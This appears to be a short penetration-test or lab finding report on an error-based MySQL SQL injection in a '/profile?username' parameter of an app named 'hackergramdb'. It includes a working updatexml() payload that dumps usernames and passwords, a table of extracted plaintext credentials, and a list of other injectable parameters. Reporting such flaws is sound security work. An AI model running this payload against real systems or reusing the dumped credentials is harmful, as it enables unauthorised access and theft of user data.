# SQL Injection in /profile?username

**Endpoint:** `GET /profile?username`
**Parameter:** `username`
**Type:** Error-based SQL Injection (MySQL updatexml())
**Risk:** Critical

## Detection
Sending a single quote `'` to the `username` parameter triggers a MySQL error:
```
(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''' at line 1")
```

## Exploitation
Error-based extraction using `updatexml()` successfully extracted:
- **Database:** MySQL 8.0.42-0ubuntu0.20.04.1
- **Schema:** hackergramdb
- **Tables:** Users, Posts, Requests, Friends
- **Users table columns:** username, password, name, bio, photo

## Extracted Credentials
| Username | Password |
|----------|----------|
| admin | 1_4m_Th3_4dm1n |
| anon1 | 1 |
| anon2 | 2 |
| anon3 | 3 |
| dpr | silk-road |
| heisenberg | walter1958 |
| mr_robot | elliot123 |

## Other SQLi-affected Parameters
- `/users?search` - SQL error on `'`
- `/posts?search` - SQL error on `'`
- `/friends?search` - SQL error on `'`

## Payload
```
/profile?username=mr_robot' AND updatexml(1,concat(0x7e,(SELECT username FROM hackergramdb.Users LIMIT 0,1),0x7e,0x3a,(SELECT password FROM hackergramdb.Users LIMIT 0,1)),1)-- 
```